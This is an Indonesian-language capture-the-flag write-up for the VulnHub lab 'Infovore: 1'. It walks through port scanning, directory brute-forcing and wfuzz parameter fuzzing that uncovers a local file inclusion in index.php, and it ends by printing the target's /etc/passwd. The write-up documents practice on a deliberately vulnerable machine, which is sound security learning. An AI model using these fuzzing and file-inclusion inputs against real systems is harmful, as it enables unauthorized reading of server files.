---
title: 'VulnHub - Infovore: 1'
author: Skofos
date: 2020-06-29 20:55:00 +0800
categories: [VulnHub]
tags: [vulnhub, LFI, RCE]
toc: true
---


> seperti biasa kalo habis dpt ilmu / main" ctf saya menuliskan writeupnya, tapi kalo bagi kalian ini adalah spoiler, pls stop reading now. cari yang laen. 

* [Infovore: 1](https://www.vulnhub.com/entry/infovore-1,496/)

## NetDiscover ?
kayanya mesin / box kali ini gk perlu pake `NetDiscover` karena sudah tercantum dari sananya heheh. 

<div align="left">
<img src="https://i.gyazo.com/85f9bf01f011cc4f5c263f5d753c70c8.png">
</div>

# Recon
## Nmap
`rustscan -T 1500 -- A -sC -sV -oN infovore.scan 192.168.59.129`
```bash
┌──[root@skofos]──[~/Desktop/vh/infovore]                                                                                                                                                 
└──# cat infovore.scan                                                                                                                                                                    
# Nmap 7.80 scan initiated Mon Jul 27 12:59:55 2020 as: nmap -A -sC -sV -oN infovore.scan -Pn -vvv -p 80 192.168.59.129                                                                   
Nmap scan report for 192.168.59.129                                                                                                                                                       
Host is up, received user-set (0.0020s latency).                                                                                                                                          
Scanned at 2020-07-27 12:59:57 EDT for 8s                                                                                                                                                 
                                                                                                                                                                                          
PORT   STATE SERVICE REASON          VERSION                                                                                                                                              
80/tcp open  http    syn-ack ttl 128 Apache httpd 2.4.38 ((Debian))                                                                                                                       
| http-methods:                                                                                                                                                                           
|_  Supported Methods: GET HEAD POST OPTIONS                                                                                                                                              
|_http-server-header: Apache/2.4.38 (Debian)                                                                                                                                              
|_http-title: Include me ...                                                                                                                                                              
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port                                                                                     
Device type: WAP                                                                                                                                                                          
Running: Actiontec embedded, Linux                                                                                                                                                        
OS CPE: cpe:/h:actiontec:mi424wr-gen3i cpe:/o:linux:linux_kernel                                                                                                                          
OS details: Actiontec MI424WR-GEN3I WAP                                                                                                                                                   
TCP/IP fingerprint:                                                                                                                                                                       
OS:SCAN(V=7.80%E=4%D=7/27%OT=80%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=5F1F0815%P=x8                                                                                                               
OS:6_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=FF%TI=I%II=I%SS=S%TS=U)OPS(O1=M5B4                                                                                                               
OS:%O2=M5B4%O3=M5B4%O4=M5B4%O5=M5B4%O6=M5B4)WIN(W1=FAF0%W2=FAF0%W3=FAF0%W4=                                                                                                               
OS:FAF0%W5=FAF0%W6=FAF0)ECN(R=Y%DF=N%TG=80%W=FAF0%O=M5B4%CC=N%Q=)T1(R=Y%DF=                                                                                                               
OS:N%TG=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=Y%DF=N%TG=80%W=FAF0%S=O%A=S+%F                                                                                                               
OS:=AS%O=M5B4%RD=0%Q=)T4(R=Y%DF=N%TG=80%W=7FFF%S=A%A=Z%F=R%O=%RD=0%Q=)T6(R=                                                                                                               
OS:Y%DF=N%TG=80%W=7FFF%S=A%A=Z%F=R%O=%RD=0%Q=)U1(R=N)IE(R=Y%DFI=N%TG=80%CD=                                                                                                               
OS:S)                                                                                                                                                                                     
                                                                                                                                                                                          
Network Distance: 2 hops                                                                                                                                                                  
TCP Sequence Prediction: Difficulty=254 (Good luck!)                                                                                                                                      
IP ID Sequence Generation: Incremental                                                                                                                                                    
                                                                                                                                                                                          
TRACEROUTE (using port 80/tcp)                                                                                                                                                            
HOP RTT     ADDRESS                                                                                                                                                                       
1   1.12 ms 192.168.172.2                                                                                                                                                                 
2   1.47 ms 192.168.59.129                                                                                                                                                                
                                                                                                                                                                                          
Read data files from: /usr/bin/../share/nmap                                                                                                                                              
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                     
# Nmap done at Mon Jul 27 13:00:05 2020 -- 1 IP address (1 host up) scanned in 10.95 seconds
```

kalo diliat-liat ini cuma web sederhana yang dibuat dari template" bootstrap. ga ada yang menarik lagian cuma one page doang.
<div style="width:100%;height:0px;position:relative;padding-bottom:56.206%;"><iframe src="https://streamable.com/e/c8b5ya?autoplay=1" frameborder="0" width="100%" height="100%" allowfullscreen style="width:100%;height:100%;position:absolute;left:0px;top:0px;overflow:hidden;"></iframe></div>

## Gobuster
`gobuster dir http://192.168.59.129 -w /usr/share/wordlists/dirb/common.txt -o infovore.gobuster`
```bash
/.hta (Status: 403)                                                                                                                                                                       
/.hta.php (Status: 403)                                                                                                                                                                   
/.hta.html (Status: 403)                                                                                                                                                                  
/.hta.bak (Status: 403)                                                                                                                                                                   
/.hta.txt (Status: 403)                                                                                                                                                                   
/.hta.php.bak (Status: 403)                                                                                                                                                               
/.htaccess (Status: 403)                                                                                                                                                                  
/.htaccess.php (Status: 403)                                                                                                                                                              
/.htaccess.html (Status: 403)                                                                                                                                                             
/.htaccess.bak (Status: 403)                                                                                                                                                              
/.htaccess.txt (Status: 403)                                                                                                                                                              
/.htaccess.php.bak (Status: 403)                                                                                                                                                          
/.htpasswd (Status: 403)                                                                                                                                                                  
/.htpasswd.php (Status: 403)                                                                                                                                                              
/.htpasswd.html (Status: 403)                                                                                                                                                             
/.htpasswd.bak (Status: 403)                                                                                                                                                              
/.htpasswd.txt (Status: 403)                                                                                                                                                              
/.htpasswd.php.bak (Status: 403)                                                                                                                                                          
/css (Status: 301)                                                                                                                                                                        
/img (Status: 301)                                                                                                                                                                        
/index.html (Status: 200)                                                                                                                                                                 
/index.php (Status: 200)                                                                                                                                                                  
/index.html (Status: 200)                                                                                                                                                                 
/index.php (Status: 200)                                                                                                                                                                  
/info.php (Status: 200)                                                                                                                                                                   
/info.php (Status: 200)                                                                                                                                                                   
/server-status (Status: 403)                                                                                                                                                              
/vendor (Status: 301)
```
wakakakak apaa niiihhh, `index.php``info.php` :D, sepertinya menariikk. wah wah wajib diliat niih.
<div align="left">
<img src="https://i.postimg.cc/1zvCPFXK/somethingphp.png">
</div>

# Wfuzz
```bash
┌──[root@skofos]──[~/Desktop/vh/infovore]                                                                                                                                               
└──# wfuzz -u 'http://192.168.59.129/index.php?FUZZ=/etc/passwd/' -w /root/Desktop/tools/SecLists/Discovery/Web-Content/burp-parameter-names.txt --hw 382                               
                                                                                                                                                                                        
Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.                               
                                                                                                                                                                                        
********************************************************                                                                                                                                
* Wfuzz 2.4.5 - The Web Fuzzer                         *                                                                                                                                
********************************************************                                                                                                                                
                                                                                                                                                                                        
Target: http://192.168.59.129/index.php?FUZZ=/etc/passwd/                                                                                                                               
Total requests: 2588                                                                                                                                                                    
                                                                                                                                                                                        
===================================================================                                                                                                                     
ID           Response   Lines    Word     Chars       Payload                                                                                                                           
===================================================================                                                                                                                     
                                                                                                                                                                                        
000000072:   200        7 L      9 W      80 Ch       "filename"                                                                                                             

Total time: 10.46127                                                                                                                                                                    
Processed Requests: 2588                                                                                                                                                                
Filtered Requests: 2587                                                                                                                                                                 
Requests/sec.: 247.3886
```
yep, interesting. lalu saya coba. and boom.
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```
